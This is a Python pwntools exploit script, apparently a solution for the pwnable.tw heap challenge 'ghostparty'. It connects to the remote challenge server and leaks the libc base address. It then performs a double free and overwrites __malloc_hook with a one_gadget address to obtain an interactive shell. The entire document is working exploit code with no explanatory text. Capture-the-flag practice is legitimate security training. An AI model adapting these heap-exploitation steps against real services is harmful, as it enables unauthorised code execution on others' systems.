from pwn import *

elf = ELF("ghostparty")
libc = ELF("libc_64.so.6")
r = remote('chall.pwnable.tw', 10401)


def add_vampire(name, age, message, blood, actrn, final=False):
    r.recvuntil(b'Your choice :')
    r.sendline(b'1')
    r.recvuntil(b'Name : ')
    r.sendline(name)
    r.recvuntil(b'Age : ')
    r.sendline(str(age).encode())
    r.recvuntil(b'Message : ')
    r.sendline(message)
    r.recvuntil(b'Choose a type of ghost :')
    r.sendline(b'7')
    if final:
        return
    r.recvuntil(b'Add blood :')
    r.sendline(blood)
    r.recvuntil(b'Your choice : ')
    r.sendline(str(actrn).encode())


def add_skull(name, age, message, bones, actrn):
    r.recvuntil(b'Your choice :')
    r.sendline(b'1')
    r.recvuntil(b'Name : ')
    r.sendline(name)
    r.recvuntil(b'Age : ')
    r.sendline(str(age).encode())
    r.recvuntil(b'Message : ')
    r.sendline(message)
    r.recvuntil(b'Choose a type of ghost :')
    r.sendline(b'4')
    r.recvuntil(b'How many bones ? : ')
    r.sendline(str(bones).encode())
    r.recvuntil(b'Your choice : ')
    r.sendline(str(actrn).encode())


def add_mummy(name, age, message, bandage, actrn):
    r.recvuntil(b'Your choice :')
    r.sendline(b'1')
    r.recvuntil(b'Name : ')
    r.sendline(name)
    r.recvuntil(b'Age : ')
    r.sendline(str(age).encode())
    r.recvuntil(b'Message : ')
    r.sendline(message)
    r.recvuntil(b'Choose a type of ghost :')
    r.sendline(b'5')
    r.recvuntil(b'Commit on bandage : ')
    r.sendline(bandage)
    r.recvuntil(b'Your choice : ')
    r.sendline(str(actrn).encode())


def listghost(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'2')
    r.recvuntil(b'Choose a ghost which you want to show in the party : ')
    r.sendline(str(index).encode())
    r.recvuntil(b'Blood : ')
    return u64(r.recv(6) + b'\0\0')


def remove_ghost(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'4')
    r.recvuntil(b'Choose a ghost which you want to remove from the party : ')
    r.sendline(str(index).encode())


with log.progress("leaking libc_base") as l:
    add_vampire(b'A', 1, b'A', b'A' * 0x88, 1)
    add_vampire(b'A', 1, b'A', b'\x01', 1)
    libc_base = listghost(1) - 0x3c3b01
    l.success(hex(libc_base))


with log.progress("overwriting address") as l:
    add_skull(b'A', 1, b'A', 0, 1)
    add_vampire(b'A', 1, b'A', b'A' * 0x67, 3)  # free name
    l.status("double free")
    remove_ghost(2)
    remove_ghost(2)  # free name again -> double free
    remove_ghost(1)
    malloc_hook = libc_base + 0x3c3aed
    one_gadget = libc_base + 0xf0567

    l.status("overwriting __malloc_hook")
    add_vampire(p64(malloc_hook).ljust(0x67, b'\0'), 1, b'A', b'A', 1)
    add_vampire(b'A' * 0x67, 1, b'A', b'A', 1)
    add_skull(b'A', 1, b'A', 0, 1)

    payload = b'\0' * 0x13 + p64(one_gadget)
    # overwrite __malloc_hook with one gadget
    add_vampire(payload.ljust(0x67, b'\0'), 1, b'', b'A', 1, True)  # '' is used to make [rsp + 0x70] == 0

r.interactive()
